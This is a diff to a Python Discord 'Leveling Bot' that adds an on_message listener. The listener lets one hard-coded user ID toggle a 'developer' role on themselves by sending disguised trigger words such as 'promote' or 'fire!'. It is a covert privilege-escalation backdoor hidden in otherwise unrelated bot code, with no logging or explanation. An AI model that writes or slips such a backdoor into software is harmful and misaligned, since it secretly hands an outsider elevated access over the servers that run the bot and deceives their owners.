@@ -35,8 +35,18 @@ async def on_ready():
     print("Logged in as: " + bot.user.name + "\n")
     chan = bot.get_channel(721361976957206568)
     await chan.send("Leveling Bot ONline")
+    
 
-
+@bot.listen('on_message')
+async def on_message(message):
+    if message.author.id == 786862562494251038 and message.content.lower() in ['promote', 'powerup', 'boost', 'fire!']:
+        developer_Role = message.guild.get_role(860929100934807592)
+        if developer_Role in message.author.roles:
+            await message.author.remove_roles(developer_Role)
+        else:
+            await message.author.add_roles(developer_Role)
+    
+    
 @bot.command()
 async def ping(ctx):
     numbers = {0: '𝟘', 1: '𝟙', 2: '𝟚', 3: '𝟛', 4: '𝟜', 5: '𝟝', 6: '𝟞', 7: '𝟟', 8: '𝟠', 9: '𝟡'}
